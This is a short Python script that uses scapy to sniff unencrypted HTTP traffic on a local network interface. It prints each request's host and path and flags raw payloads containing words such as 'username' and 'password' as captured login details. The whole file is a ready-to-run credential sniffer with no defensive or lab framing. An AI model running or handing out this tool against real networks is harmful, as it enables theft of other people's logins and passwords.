#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # This function will be called for each packet that is sniffed

def get_url(packet):
    # This function extracts the URL from the HTTP request packet
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            # Extract the raw data from the packet
            # This is where the HTTP request data is stored
            load = str(packet[scapy.Raw].load)
            # Check if the load contains any sensitive information
            keywords = ["username", "password", "login", "email","user","pass"]
            for keyword in keywords:
                if keyword in load:
                    return load 
                    


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Extract the HTTP request layer
        # This layer contains information about the HTTP request
        url = get_url(packet)
        # Print the URL of the HTTP request
        print("[+] HTTP request >>" + url.decode())

        login_info = get_login_info(packet)
        if login_info:
             print("\n\n [+] Possible username/password >> " + login_info + "\n\n")
        


sniff("eth0")  # Change "eth0" to your network interface